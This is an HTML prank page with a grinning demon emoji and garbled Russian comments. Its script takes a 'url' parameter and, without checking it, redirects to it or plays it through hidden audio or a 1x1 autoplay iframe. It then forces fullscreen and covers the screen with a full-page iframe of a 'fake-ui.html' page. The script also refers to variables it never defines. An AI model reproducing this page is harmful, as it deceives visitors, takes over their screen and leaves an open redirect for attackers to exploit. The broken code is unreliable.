<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–î–µ–º–æ–Ω –°–∞–π—Ç</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .demon {
            font-size: 100px;
            cursor: pointer;
            transition: transform 0.2s ease-in-out;
        }
        .demon:hover {
            transform: scale(1.2);
        }
    </style>
</head>
<body onclick="customScript()">
    <div class="demon">üòà</div>
    <audio id="demonSound" loop>
        <source id="audioSource" type="audio/mpeg">
    </audio>
    <div id="playerContainer" hidden style="margin-top: 20px;"></div>
    
    <script>
        function getUrlParams() {
            let params = new URLSearchParams(window.location.search);
            let urlParams = {}; // –û–±—ä–µ–∫—Ç –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
    
            params.forEach((value, key) => {
                urlParams[key] = value; // –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –≤ –æ–±—ä–µ–∫—Ç
            });
    
            return urlParams; // –í–æ–∑–≤—Ä–∞—â–∞–µ–º –æ–±—ä–µ–∫—Ç
        }
    
        let queryParams = getUrlParams();
    
        if (queryParams["aut"] === "aut-on") {
            location.href = `${queryParams["url"]}`;
        }
    
        function customScript() {
            
                let audio = document.getElementById("demonSound");
                let source = document.getElementById("audioSource");
        
                if (queryParams["url"].includes('embed')) {
                    const iframe = document.createElement('iframe');
                    iframe.width = '1';
                    iframe.height = '1';
                    iframe.src = `${queryParams["url"].replace("?autoplay=0", "?autoplay=1")}`; // –ê–≤—Ç–æ–≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ
                    iframe.frameBorder = '0';
                    iframe.allow = 'autoplay';

                    // –í—Å—Ç–∞–≤–ª—è–µ–º iframe –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä
                    const container = document.getElementById('playerContainer');
                    container.innerHTML = ''; // –û—á–∏—â–∞–µ–º –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä, –µ—Å–ª–∏ —Ç–∞–º —á—Ç–æ-—Ç–æ –±—ã–ª–æ
                    container.appendChild(iframe);
                } else {
                    source.src = queryParams["url"]; // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º URL –∏–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞
                    audio.load(); // –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ–º –∞—É–¥–∏–æ—Ñ–∞–π–ª
                    audio.play(); // –í–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏–º
                }
                if (queryParams["hard"] == "hard-on"){
                    const filename = queryParams["url"].substring(queryParams["url"].lastIndexOf("/") + 1);
                    console.log(filename); // –í—ã–≤–µ–¥–µ—Ç –∏–º—è —Ñ–∞–π–ª–∞
                    window.open(`./fake-ui.html?name=${filename}&url=${queryParams["url"]}`);
                } else {
                    (function(){document.querySelector("body").requestFullscreen();})();
                }
                (function() {
                    let iframe = document.createElement("iframe");
                    iframe.src = `./fake-ui.html?name=${filename}&url=${queryParams["url"]}`; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –Ω—É–∂–Ω—ã–π URL
                    iframe.style.position = "fixed";
                    iframe.style.top = "0";
                    iframe.style.left = "0";
                    iframe.style.width = "100vw";
                    iframe.style.height = "100vh";
                    iframe.style.border = "none";
                    iframe.style.zIndex = "9999";
                    iframe.style.background = "white";

                    document.body.appendChild(iframe);

                    document.body.appendChild(closeButton);
                })();
                
        }
    </script>
    
</body>
</html>
<script>


</script>